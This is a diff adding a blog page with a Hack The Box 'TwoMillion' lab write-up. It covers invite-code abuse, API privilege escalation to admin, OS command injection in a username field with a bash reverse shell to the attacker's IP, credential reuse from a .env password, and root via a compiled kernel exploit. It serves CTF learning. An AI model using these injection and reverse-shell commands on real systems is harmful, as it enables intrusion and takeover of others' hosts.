@@ -1,0 +1,483 @@
+export const frontmatter = {
+  title: "Hack The Box TwoMillion Machine Writeup",
+  slug: "hack-the-box-twomillion-machine-writeup",
+  category: "HTB Machine",
+  tags: "api-command-injection, sshpass, dirtyfrag, mail, looney-tunables, GLIBC liblary",
+  description:
+    "Complete walkthrough of the Hack The Box TwoMillion machine, covering invite code generation, API enumeration, privilege escalation to admin through an insecure API endpoint, OS command injection to obtain a shell as www-data, credential reuse for admin access, and Linux privilege escalation using DirtyFrag and Looney Tunables.",
+  date: "2026-08-04",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box TwoMillion Writeup | API Abuse to Root via Command Injection, DirtyFrag & Looney Tunables | loxcalhost",
+  description:
+    "Step-by-step Hack The Box TwoMillion writeup covering invite code generation, API enumeration, admin privilege escalation through insecure settings, OS command injection for a www-data shell, credential reuse for admin access, and privilege escalation to root using DirtyFrag and Looney Tunables.",
+};
+
+# HTB: TwoMillion — Writeup
+
+- **Target IP:** 10.129.3.130
+- **Platform:** Linux
+- **Difficulty:** Easy
+
+## Recon
+
+### nmap
+
+`nmap` finds two open ports, SSH (22) and HTTP (80), and one filtered port:
+
+```bash
+Nmap scan report for 2million.htb (10.129.3.130)
+Host is up, received syn-ack (0.31s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE    SERVICE REASON      VERSION
+22/tcp   open     ssh     syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp   open     http    syn-ack     nginx
+8045/tcp filtered unknown no-response
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 54.24 seconds
+```
+
+> **NOTE:** I already added `2million.htb` to `/etc/hosts`.
+
+Since a DNS server name is in use, I performed VHOST brute-forcing with gobuster to check for anything different, but unfortunately nothing new came back.
+
+### Website — TCP Port 80
+
+We're presented with the HackTheBox site as it looked in 2017.
+
+The HTTP headers don't reveal any information that's immediately useful:
+
+```http
+HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 03 Aug 2026 14:50:30 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Set-Cookie: PHPSESSID=096kej2gosuk5bhs4c742j6vom; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+```
+
+## Shell as www-data
+
+### Invite Code Discovery
+
+The only functional endpoints on the site are `/login` and `/join`.
+
+`/login` requires existing credentials, and the password reset functionality turns out to be a dead end.
+
+`/join` requires a valid invite code to sign up. Inspecting the page source reveals an interesting script reference:
+
+```html
+<script defer src="/js/inviteapi.min.js"></script>
+```
+
+The contents of this file are obfuscated using Dean Edwards' Packer (commonly known as JavaScript P.A.C.K.E.R. obfuscation):
+
+```javascript
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\b'+e(c)+'\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
+```
+
+With the help of an AI, the deobfuscated script turns out to be:
+
+```javascript
+function verifyInviteCode(code) {
+    var formData = {
+        code: code
+    };
+
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        data: formData,
+        url: "/api/v1/invite/verify",
+        success: function(response) {
+            console.log(response);
+        },
+        error: function(response) {
+            console.log(response);
+        }
+    });
+}
+
+function makeInviteCode() {
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        url: "/api/v1/invite/how/to/generate",
+        success: function(response) {
+            console.log(response);
+        },
+        error: function(response) {
+            console.log(response);
+        }
+    });
+}
+```
+
+This reveals an endpoint that can be used to get instructions for generating an invite code:
+
+```bash
+$ curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
+
+{
+  "0": 200,
+  "success": 1,
+  "data": {
+    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
+    "enctype": "ROT13"
+  },
+  "hint": "Data is encrypted ... We should probably check the encryption type in order to decrypt it..."
+}
+```
+
+The response data is ROT13-encoded and can be decoded as follows:
+
+```bash
+$ echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+In order to generate the invite code, make a POST request to /api/v1/invite/generate
+```
+
+So we need to make a POST request to `/api/v1/invite/generate` to get a valid invite code:
+
+```bash
+$ curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
+
+{
+  "0": 200,
+  "success": 1,
+  "data": {
+    "code": "NkM1OFctNlo0OE4tVUIzWUotUFlaODE=",
+    "format": "encoded"
+  }
+}
+```
+
+The code is base64-encoded and can be decoded directly:
+
+```bash
+$ echo "NkM1OFctNlo0OE4tVUIzWUotUFlaODE=" | base64 -d
+
+6C58W-6Z48N-UB3YJ-PYZ81
+```
+
+This code can now be used to register an account via `/join`.
+
+### Enumeration as an Authenticated User
+
+Under `/home/access`, clicking Connection Pack sends a GET request to `/api/v1/user/vpn/generate`, while Regenerate sends a GET request to `/api/v1/user/vpn/regenerate`.
+
+Sending a plain GET request to `/api` reveals API versioning information:
+
+```bash
+$ curl -b "PHPSESSID=f92a2e4t7tgjr3m3qedlib0bd3" http://2million.htb/api | jq
+
+{
+  "/api/v1": "Version 1 of the API"
+}
+```
+
+Querying `/api/v1` returns a full list of available routes:
+
+```json
+{
+  "v1": {
+    "user": {
+      "GET": {
+        "/api/v1": "Route List",
+        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
+        "/api/v1/invite/generate": "Generate invite code",
+        "/api/v1/invite/verify": "Verify invite code",
+        "/api/v1/user/auth": "Check if user is authenticated",
+        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
+        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
+        "/api/v1/user/vpn/download": "Download OVPN file"
+      },
+      "POST": {
+        "/api/v1/user/register": "Register a new user",
+        "/api/v1/user/login": "Login with existing user"
+      }
+    },
+    "admin": {
+      "GET": {
+        "/api/v1/admin/auth": "Check if user is admin"
+      },
+      "POST": {
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+      },
+      "PUT": {
+        "/api/v1/admin/settings/update": "Update user settings"
+      }
+    }
+  }
+}
+```
+
+### Escalating to Admin via the API
+
+The `/api/v1/admin/settings/update` endpoint can be used to modify user settings — potentially allowing us to promote our own account to admin:
+
+```bash
+$ curl -s -X PUT -b "PHPSESSID=f92a2e4t7tgjr3m3qedlib0bd3" http://2million.htb/api/v1/admin/settings/update | jq
+
+{
+  "status": "danger",
+  "message": "Invalid content type."
+}
+```
+
+This suggests the endpoint expects JSON:
+
+```bash
+$ curl -s -X PUT -H "Content-Type: application/json" -b "PHPSESSID=f92a2e4t7tgjr3m3qedlib0bd3" http://2million.htb/api/v1/admin/settings/update | jq
+
+{
+  "status": "danger",
+  "message": "Missing parameter: email"
+}
+```
+
+Supplying the required parameters incrementally:
+
+```bash
+$ curl -X PUT -H "Content-Type: application/json" -b "PHPSESSID=f92a2e4t7tgjr3m3qedlib0bd3" http://2million.htb/api/v1/admin/settings/update -d '{"email":"onivdoniv@gmail.com"}' | jq
+
+{
+  "status": "danger",
+  "message": "Missing parameter: is_admin"
+}
+```
+
+```bash
+$ curl -s -X PUT -H "Content-Type: application/json" -b "PHPSESSID=f92a2e4t7tgjr3m3qedlib0bd3" http://2million.htb/api/v1/admin/settings/update -d '{"email":"onivdoniv@gmail.com", "is_admin":"true"}' | jq
+
+{
+  "status": "danger",
+  "message": "Variable is_admin needs to be either 0 or 1."
+}
+```
+
+Sending the correct value type finally succeeds:
+
+```bash
+$ curl -s -X PUT -H "Content-Type: application/json" -b "PHPSESSID=f92a2e4t7tgjr3m3qedlib0bd3" http://2million.htb/api/v1/admin/settings/update -d '{"email":"onivdoniv@gmail.com", "is_admin":1}' | jq
+
+{
+  "id": 13,
+  "username": "loxcalhost",
+  "is_admin": 1
+}
+```
+
+Confirming admin status:
+
+```bash
+$ curl -s -X GET -b "PHPSESSID=f92a2e4t7tgjr3m3qedlib0bd3" http://2million.htb/api/v1/admin/auth | jq
+
+{
+  "message": true
+}
+```
+
+### Command Injection
+
+As an admin user, we can now generate VPN configurations for other users via `/api/v1/admin/vpn/generate`:
+
+```bash
+$ curl -X POST -H "Content-Type: application/json" -b "PHPSESSID=f92a2e4t7tgjr3m3qedlib0bd3" http://2million.htb/api/v1/admin/vpn/generate | jq
+
+{
+  "status": "danger",
+  "message": "Missing parameter: username"
+}
+```
+
+Supplying a `username` parameter returns a valid OpenVPN configuration file:
+
+```bash
+$ curl -s -X POST -H "Content-Type: application/json" -b "PHPSESSID=f92a2e4t7tgjr3m3qedlib0bd3" http://2million.htb/api/v1/admin/vpn/generate -d '{"username":"loxcalhost"}'
+
+client
+dev tun
+proto udp
+remote edge-eu-free-1.2million.htb 1337
+resolv-retry infinite
+nobind
+persist-key
+...[SNIP]...
+```
+
+The `username` parameter turns out to be vulnerable to OS command injection:
+
+```bash
+$ curl -s -X POST -H "Content-Type: application/json" -b "PHPSESSID=f92a2e4t7tgjr3m3qedlib0bd3" http://2million.htb/api/v1/admin/vpn/generate -d '{"username":"loxcalhost; id #"}'
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Replacing `id` with a bash reverse shell one-liner:
+
+```bash
+$ curl -s -X POST -H "Content-Type: application/json" -b "PHPSESSID=f92a2e4t7tgjr3m3qedlib0bd3" http://2million.htb/api/v1/admin/vpn/generate -d "{\"username\":\"loxcalhost; bash -c 'bash -i >& /dev/tcp/10.10.14.236/9001 0>&1' #\"}"
+```
+
+Catching the resulting connection on our listener:
+
+```bash
+$ nc -lvnp 9001
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.129.3.130:57818.
+bash: cannot set terminal process group (1094): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2million:~/html$
+```
+
+Finally, upgrade the shell to a fully interactive TTY:
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+## Shell as admin
+
+### Enumeration
+
+The web root is in the default location, `/var/www/html`:
+
+```bash
+www-data@2million:~/html$ ls -la
+
+total 56
+drwxr-xr-x 10 root root 4096 Jun  2 22:30 .
+drwxr-xr-x  3 root root 4096 May 26 20:34 ..
+drwxr-xr-x  2 root root 4096 May 23 19:37 assets
+drwxr-xr-x  2 root root 4096 Jun  2 16:30 controllers
+drwxr-xr-x  5 root root 4096 May 29 12:21 css
+-rw-r--r--  1 root root 1237 Jun  2 16:15 Database.php
+-rw-r--r--  1 root root   87 Jun  2 18:56 .env
+drwxr-xr-x  2 root root 4096 May 25 17:57 fonts
+drwxr-xr-x  2 root root 4096 May 25 16:23 images
+-rw-r--r--  1 root root 2692 Jun  2 18:57 index.php
+drwxr-xr-x  3 root root 4096 Jun  1 20:15 js
+-rw-r--r--  1 root root 2787 Jun  2 16:15 Router.php
+drwxr-xr-x  2 root root 4096 Jun  2 16:15 views
+drwxr-xr-x  5 root root 4096 Jun  2 22:30 VPN
+```
+
+The `.env` file is used to set environment variables in PHP web frameworks:
+
+```bash
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+```
+
+### Pivot
+
+That password works for both `su` as admin:
+
+```bash
+www-data@2million:~/html$ su - admin
+Password:
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+admin@2million:~$
+```
+
+And SSH:
+
+```bash
+oxdf@hacky$ sshpass -p SuperDuperPass123 ssh admin@2million.htb
+
+admin@2million:~$
+```
+
+> **NOTE:** `sshpass` is a convenient tool for CTF write-ups and blog posts because it makes the authentication process explicit and easy to follow. However, it should never be used with real production credentials, as passing passwords on the command line is insecure and can expose sensitive information.
+
+## Shell as Root
+
+### Enumeration
+
+Since this box was released in mid-2023, it's now roughly three years old, meaning the kernel is outdated and vulnerable to **DirtyFrag** (a CVE affecting the Linux kernel's page cache handling):
+
+```bash
+admin@2million:~$ uname -r
+
+5.15.70-051570-generic
+```
+
+### DirtyFrag Exploitation
+
+A public proof-of-concept (PoC) is available on GitHub: [https://github.com/V4bel/dirtyfrag](https://github.com/V4bel/dirtyfrag)
+
+Copy the contents of `exp.c` from the PoC into `/tmp/exp.c`, then compile it:
+
+```bash
+gcc -O0 -Wall -o exp exp.c -lutil
+```
+
+Finally, execute the exploit to obtain root privileges:
+
+```bash
+./exp
+```
+
+> **Note:** This is not the intended privilege escalation path for this machine — it worked simply because, over time, new vulnerabilities are discovered in older kernel versions that remain unpatched.
+
+## Beyond Root
+
+### Hint for Privilege Escalation
+
+I generally check kernel versions to see if they're outdated, but on this box there's also a very telling clue: an email under `/var/mail` that directly references the issue.
+
+```text
+From: ch4p <ch4p@2million.htb>
+To: admin <admin@2million.htb>
+Cc: g0blin <g0blin@2million.htb>
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: <9876543210@2million.htb>
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather
+```
+
+This email was sent on 1 June 2023, so searching for **"linux kernel vulnerability 2023"** around that timeframe points us toward known kernel CVEs disclosed that year:
+
+![kernel_vuln_2023](https://res.cloudinary.com/dbe72hpba/image/upload/v1785842077/photo_2026-08-04_16-43-58_cstphc.jpg)
+
+### Looney Tunables
+
+Checking the GLIBC library version on the target:
+
+```bash
+admin@2million:/var/mail$ ldd --version
+
+ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
+Copyright (C) 2022 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions. There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+Written by Roland McGrath and Ulrich Drepper.
+```
+
+GNU C Library version 2.35 is also vulnerable — specifically to **CVE-2023-4911**, better known as **"Looney Tunables,"** a buffer overflow in glibc's dynamic loader (`ld.so`) that can be exploited via the `GLIBC_TUNABLES` environment variable to achieve local privilege escalation:
+
+![gnuclib](https://res.cloudinary.com/dbe72hpba/image/upload/v1785842077/photo_2026-08-04_16-43-58_cstphc.jpg)
